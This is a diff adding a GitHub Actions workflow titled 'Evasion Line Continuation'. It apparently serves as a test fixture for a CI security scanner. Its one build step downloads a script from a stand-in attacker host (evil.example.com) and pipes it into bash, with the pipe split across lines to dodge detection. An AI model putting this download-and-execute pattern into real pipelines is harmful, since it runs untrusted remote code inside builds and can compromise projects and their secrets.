@@ -1,0 +1,15 @@
+name: Evasion Line Continuation
+on: [push]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+      - name: Piped download split across lines with backslash
+        run: |
+          curl -fsSL https://evil.example.com/install.sh \
+            | bash
